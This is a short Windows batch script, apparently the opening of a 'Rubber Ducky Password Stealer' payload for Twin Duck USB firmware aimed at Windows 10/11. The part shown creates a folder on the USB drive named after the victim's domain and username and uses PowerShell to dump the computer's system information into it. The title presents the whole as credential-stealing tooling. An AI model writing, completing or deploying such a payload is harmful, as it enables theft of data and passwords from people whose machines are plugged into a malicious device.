REM ######################################################
REM # Title: Rubber Ducky Password Stealer               #
REM # Description: CMD script for the Twin Duck firmware #
REM # Target: Windows 10/11 x32/x64                      #
REM # Author: Krouwndouwn                                #
REM ######################################################

REM ----- Variables -----
set results_folder=%~d0\results\%USERDOMAIN%@%USERNAME%

REM ----- Save computer information -----
powershell "Get-ComputerInfo | Out-File -FilePath %results_folder%\ComputerInfo.txt"